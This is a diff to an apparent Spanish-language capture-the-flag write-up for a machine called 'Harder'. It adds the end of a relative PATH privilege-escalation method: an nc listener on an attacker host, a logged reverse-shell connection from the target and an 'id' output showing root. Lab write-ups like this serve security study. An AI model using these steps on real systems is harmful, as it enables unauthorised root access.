@@ -487,6 +487,7 @@ Ejecutamos el binario para que realize todo el proceso.
 ---
 ---> Maquina Harder completa Metodo 1 <---
 ---
+---
 
 
 ### Metodo 2: Mediante Ataque Relative PATH
@@ -534,7 +535,26 @@ Por lo que vemos podemos crear un binario llamado "whoami" en el directorio /tmp
 	harder:/tmp$ echo $PATH
 		/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 
-  --
+  --Nos ponemos en escucha preparados para recibir la shell y obtener la flag.
+
+	┌──(root㉿kali)-[/home/kali/Desktop/ctf/harder]
+	└─# nc -lnvp 1988
+	listening on [any] 1988 ...
+	connect to [10.18.54.226] from (UNKNOWN) [10.10.123.120] 35677
+ 
+		harder:/tmp# id
+		uid=0(root) gid=1000(evs) groups=1000(evs)
+
+--Ejecutamos el binario para que realize todo el proceso.
+
+	harder:/tmp$ /usr/local/bin/execute-crypted 
+	[*] Current User:
+	
+---
+---> Maquina Harder completa Metodo 2 <---
+---
+---
+
 
 
 
